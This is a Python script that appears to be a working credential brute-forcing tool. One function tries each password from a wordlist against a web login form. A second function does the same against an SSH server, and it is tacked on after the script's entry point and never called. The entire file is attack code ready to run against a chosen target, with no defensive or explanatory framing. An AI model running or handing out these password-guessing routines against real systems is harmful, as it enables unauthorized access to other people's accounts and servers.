import requests
import argparse
from rich.console import Console

console = Console()

def http_brute(url, username, wordlist_path, fail_text="Invalid"):
    console.print(f"\n[bold cyan][*] Starting HTTP brute force on {url}[/bold cyan]")
    console.print(f"[*] Username: {username}")
    console.print(f"[*] Wordlist: {wordlist_path}\n")

    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        console.print(f"[red][-] Wordlist not found: {wordlist_path}[/red]")
        return None

    console.print(f"[*] Loaded {len(passwords)} passwords\n")

    for i, password in enumerate(passwords):
        try:
            response = requests.post(
                url,
                json={"username": username, "password": password},
                timeout=5
            )
            if fail_text not in response.text:
                console.print(f"[bold green][+] PASSWORD FOUND: {password}[/bold green]")
                console.print(f"[bold green][+] Login successful for {username}:{password}[/bold green]")
                return password
            else:
                console.print(f"[dim][-] Tried {i+1}/{len(passwords)} — {password}[/dim]")
        except requests.exceptions.RequestException as e:
            console.print(f"[red][-] Request error: {e}[/red]")
            continue

    console.print(f"[red][-] Password not found in wordlist.[/red]")
    return None

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HTTP Login Brute Forcer")
    parser.add_argument("--url", required=True, help="Target login URL")
    parser.add_argument("--username", required=True, help="Username to attack")
    parser.add_argument("--wordlist", required=True, help="Path to wordlist")
    parser.add_argument("--fail-text", default="Invalid", help="Text in response when login fails")
    args = parser.parse_args()

    http_brute(args.url, args.username, args.wordlist, fail_text=args.fail_text)

import paramiko

def ssh_brute(host, username, wordlist_path, port=22):
    console.print(f"\n[bold cyan][*] Starting SSH brute force on {host}:{port}[/bold cyan]")
    console.print(f"[*] Username: {username}")
    console.print(f"[*] Wordlist: {wordlist_path}\n")

    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        console.print(f"[red][-] Wordlist not found: {wordlist_path}[/red]")
        return None

    console.print(f"[*] Loaded {len(passwords)} passwords\n")

    for i, password in enumerate(passwords):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port=port, username=username, password=password, timeout=3)
            console.print(f"[bold green][+] PASSWORD FOUND: {password}[/bold green]")
            console.print(f"[bold green][+] SSH login successful for {username}:{password}[/bold green]")
            client.close()
            return password
        except paramiko.AuthenticationException:
            console.print(f"[dim][-] Tried {i+1}/{len(passwords)} — {password}[/dim]")
        except Exception as e:
            console.print(f"[red][-] Error: {e}[/red]")
            continue

    console.print(f"[red][-] Password not found in wordlist.[/red]")
    return None
